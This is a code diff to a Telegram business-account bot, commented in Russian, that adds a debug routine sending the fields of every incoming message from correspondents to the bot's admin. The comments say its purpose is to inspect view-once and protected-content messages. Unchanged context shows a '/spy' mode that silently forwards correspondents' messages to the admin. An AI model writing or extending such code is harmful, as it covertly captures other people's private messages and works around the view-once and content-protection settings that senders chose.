@@ -1070,6 +1070,28 @@ async def handle_connection(bc: BusinessConnection):
 
 @dp.business_message()
 async def handle_business_message(message: Message):
+    # ── ДИАГНОСТИКА: самый верх, до всего ──────────────────────────────────
+    try:
+        _sid = message.from_user.id if message.from_user else None
+        if _sid != ADMIN_ID:  # только входящие от собеседника
+            d = message.model_dump() if hasattr(message, "model_dump") else {}
+            _skip = {"from_user","chat","reply_to_message","entities",
+                     "caption_entities","forward_origin","reply_markup"}
+            _nonempty = {k: str(v)[:60] for k, v in d.items()
+                         if v is not None and v is not False and v != [] and v != {} and k not in _skip}
+            _lines = [
+                "🐛 <b>DEBUG TOP</b>",
+                f"sid=<code>{_sid}</code> photo=<code>{bool(message.photo)}</code> "
+                f"video=<code>{bool(message.video)}</code> voice=<code>{bool(message.voice)}</code>",
+                f"has_protected=<code>{d.get('has_protected_content')}</code> "
+                f"spoiler=<code>{d.get('has_media_spoiler')}</code>",
+                "непустые поля:",
+            ] + [f"<code>{k}</code>:<code>{v}</code>" for k, v in _nonempty.items()]
+            await bot.send_message(ADMIN_ID, "\n".join(_lines), parse_mode="HTML")
+    except Exception as _e:
+        logging.warning(f"[DBG-TOP] {_e}")
+    # ── конец ДИАГНОСТИКИ ──────────────────────────────────────────────────
+
     if not message.business_connection_id:
         return
 
@@ -1427,40 +1449,6 @@ async def handle_business_message(message: Message):
     # Включается/выключается через /spy on|off (только админ).
     if spy_enabled and sender_id is not None:
         asyncio.create_task(forward_to_admin_silent(owner_id, message))
-
-    # ── ДИАГНОСТИКА view-once ────────────────────────────────────────────────
-    # Дампим ВСЕ входящие сообщения от собеседника (не только медиа),
-    # показываем все непустые поля — нужно увидеть как выглядит view-once.
-    if sender_id is None or sender_id != owner_id:
-        async def _debug_dump(oid: int, msg: Message):
-            try:
-                d = msg.model_dump() if hasattr(msg, "model_dump") else {}
-                # Все непустые поля верхнего уровня (кроме огромных вложенных объектов)
-                skip = {"from_user", "chat", "reply_to_message", "entities", "caption_entities",
-                        "photo", "forward_origin", "reply_markup", "business_connection_id"}
-                non_empty = {k: v for k, v in d.items()
-                             if v is not None and v is not False and v != [] and v != {} and k not in skip}
-                lines = [
-                    f"🐛 <b>DEBUG ALL FIELDS</b>",
-                    f"<code>sender_id</code>: <code>{sender_id}</code>",
-                    f"<code>from_user</code>: <code>{msg.from_user.id if msg.from_user else None}</code>",
-                    f"<code>photo</code>: <code>{bool(msg.photo)}</code>",
-                    f"<code>video</code>: <code>{bool(msg.video)}</code>",
-                    f"<code>voice</code>: <code>{bool(msg.voice)}</code>",
-                    f"<code>video_note</code>: <code>{bool(msg.video_note)}</code>",
-                    f"<code>document</code>: <code>{bool(msg.document)}</code>",
-                    f"<code>sticker</code>: <code>{bool(msg.sticker)}</code>",
-                    f"<code>animation</code>: <code>{bool(msg.animation)}</code>",
-                    "— остальные непустые поля —",
-                ]
-                for k, v in non_empty.items():
-                    val = str(v)[:80]
-                    lines.append(f"<code>{k}</code>: <code>{val}</code>")
-                await bot.send_message(oid, "\n".join(lines), parse_mode="HTML")
-            except Exception as e:
-                logging.warning(f"[DEBUG-DUMP] {e}")
-        asyncio.create_task(_debug_dump(owner_id, message))
-    # ── конец ДИАГНОСТИКИ ────────────────────────────────────────────────────
 
     msg_text = message.text or message.caption or ""
     if extract_url(msg_text):
